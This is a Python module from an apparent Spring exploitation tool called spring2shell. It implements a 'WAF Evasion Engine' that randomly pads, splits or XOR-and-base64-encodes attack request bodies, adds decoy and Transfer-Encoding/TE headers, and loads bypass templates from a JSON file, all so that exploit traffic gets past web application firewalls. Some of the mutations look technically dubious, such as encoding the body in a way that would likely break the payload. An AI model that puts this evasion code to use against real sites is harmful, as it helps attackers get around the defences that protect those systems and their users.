"""
WAF Evasion Engine — body and header mutation for spring2shell.

Provides:
- WAFEvasionEngine : random body/header mutations to evade WAF fingerprinting
- load_waf_bypasses(): load structural bypass templates from data/payloads/waf_bypasses.json
"""

from __future__ import annotations

import base64
import hashlib
import json
import os
import random
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Data loader
# ---------------------------------------------------------------------------


def load_waf_bypasses(data_root: str | Path | None = None) -> list[dict[str, Any]]:
    """Load WAF bypass templates from the JSON data file.

    Returns an empty list if the file cannot be found or parsed.
    """
    if data_root is None:
        data_root = Path(__file__).parents[3] / "data"
    path = Path(data_root) / "payloads" / "waf_bypasses.json"
    try:
        with path.open() as fh:
            data = json.load(fh)
        return data.get("bypasses", [])
    except (FileNotFoundError, json.JSONDecodeError, KeyError):
        return []


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------


class WAFEvasionEngine:
    """Apply random body and header mutations to evade WAF detection."""

    def __init__(self) -> None:
        self._junk_cache: dict[int, str] = {}

    # ── private helpers ──────────────────────────────────────────────────────

    def _junk(self, size: int) -> str:
        if size not in self._junk_cache:
            self._junk_cache[size] = os.urandom(size).hex()
        return self._junk_cache[size]

    # ── body mutation ────────────────────────────────────────────────────────

    def mutate_body(self, body: str, technique: str = "pad") -> str:
        """Apply one of three body mutation techniques.

        Args:
            body:      Original request body.
            technique: One of ``"pad"``, ``"chunk"``, ``"xor"``.

        Returns:
            Mutated body string.
        """
        if technique == "pad":
            return self._junk(2048) + body
        if technique == "chunk":
            return "\r\n".join(body[i : i + 50] for i in range(0, len(body), 50))
        if technique == "xor":
            raw = body.encode()
            mask = random.randint(1, 255)
            return base64.b64encode(bytes([c ^ mask for c in raw])).decode()
        return body

    # ── header mutation ──────────────────────────────────────────────────────

    def mutate_headers(self, headers: dict[str, str]) -> dict[str, str]:
        """Inject decoy / confusion headers to hinder WAF fingerprinting."""
        mutated = headers.copy()
        mutated.setdefault("X-Request-Random", hashlib.sha1(os.urandom(8)).hexdigest())
        if random.random() < 0.3:
            mutated["Transfer-Encoding"] = "chunked"
        if random.random() < 0.4:
            mutated["TE"] = random.choice(["trailers", "deflate"])
        return mutated

    # ── combined apply ───────────────────────────────────────────────────────

    def apply(self, body: str, headers: dict[str, str]) -> tuple[str, dict[str, str]]:
        """Apply a randomly selected body mutation + header mutation.

        Returns:
            Tuple of (mutated_body, mutated_headers).
        """
        technique = random.choice(["pad", "chunk", "xor"])
        return self.mutate_body(body, technique), self.mutate_headers(headers)


# Module-level singleton — matches previous monolith usage pattern.
waf_engine = WAFEvasionEngine()
